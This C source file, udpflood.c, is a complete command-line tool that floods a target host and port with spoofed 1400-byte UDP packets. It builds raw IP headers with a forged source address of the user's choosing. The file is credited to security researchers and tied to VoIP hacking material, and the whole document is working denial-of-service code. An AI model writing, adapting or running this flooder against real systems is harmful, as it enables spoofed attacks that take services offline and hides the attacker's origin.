//-------------------------------------------------------------------------------
//
// udpflood.c - Command line tool used to flood a 
//              targeted destination:port specified upon
//              the command line with the specified
//              number of - approximately - 1400 byte UDP
//              packets. The source IP address:port of the
//              packets are also set in accordance with
//              command line inputs also.
//
//  This tool is derived from code downloaded from
//  www.packetstromsecurity.nl. Its origin is
//  unknown. There was no copyright or license
//  accompanying the code. As such, the following
//  copyright/license is applied to this derivation.
//
//    Copyright (C) 2004  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//   Author: Mark D. Collier/Mark O'Brien - 08/17/2004  v3.0
//         www.securelogix.com - mark.collier@securelogix.com
//         www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

struct sockaddr sa;

main ( int argc, char **argv ) {
    
    int fd;
    int x = 1;
    int srcport, destport;
    int numpackets;

    struct sockaddr_in *p;
    struct hostent *he;
        
    u_char gram[1400] = {
            0x45,	0x00,	0x00,	0x26,
            0x12,	0x34,	0x00,	0x00,
            0xFF,	0x11,	0,	0,
            0,	0,	0,	0,
            0,	0,	0,	0,

            0,	0,	0,	0,
            0x05,	0x64,	0x00,	0x00,

            '1','2','3','4','5','6','7','8','9','0'
    };

    if ( argc != 6 ) {
        fprintf ( stderr,
                  "usage: %s sourcename destinationname srcport destport numpackets\n",
                  *argv );
        exit ( EXIT_FAILURE );
    }

    srcport     = atoi ( argv[3] );
    destport    = atoi ( argv[4] );
    numpackets  = atoi ( argv[5] );

    fprintf ( stderr,
              "Will flood port %d from port %d %d times",
              destport, srcport, numpackets );

    if ( ( he = gethostbyname ( argv[1] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve source hostname\n" );
        exit ( EXIT_FAILURE );
    }
    bcopy ( *(he->h_addr_list), (gram+12), 4 );

    if ( ( he = gethostbyname( argv[2] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve destination hostname\n" );
        exit ( EXIT_FAILURE );
    }
    
    bcopy ( *(he->h_addr_list), (gram+16), 4 );

    *(u_short*)(gram+20) = htons( (u_short) srcport  );
    *(u_short*)(gram+22) = htons( (u_short) destport );

    p = ( struct sockaddr_in* ) &sa;
    p->sin_family = AF_INET;
    bcopy ( *(he->h_addr_list), &(p->sin_addr), sizeof(struct in_addr) );

    if ( ( fd = socket ( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) == -1 ) {
        perror("socket");
        exit ( EXIT_FAILURE );
    }

    #ifdef IP_HDRINCL
    fprintf ( stderr, "\nWe have IP_HDRINCL \n" );
    if ( setsockopt ( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x, sizeof(x) ) < 0 ) {
        perror ( "setsockopt IP_HDRINCL" );
        exit ( EXIT_FAILURE );
    }
    #else
    fprintf ( stderr, "\nWe don't have IP_HDRINCL \n" );
    #endif

    printf("\nNumber of Packets sent:\n\n");
    
    //
    //  Main loop
    //
            
    for ( x = 0; x < numpackets; x++ ) {
        if ( ( sendto ( fd,
                        &gram,
                        sizeof(gram),
                        0,
                        ( struct sockaddr* ) p,
                        sizeof(struct sockaddr) ) )
              == -1 ) {
            perror ( "sendto" );
            exit ( EXIT_FAILURE );
        }       
        printf ( "\rSent %d ", x+1 );
    }
    
    printf ( "\n" );
    exit ( EXIT_SUCCESS );
} // end udpflood
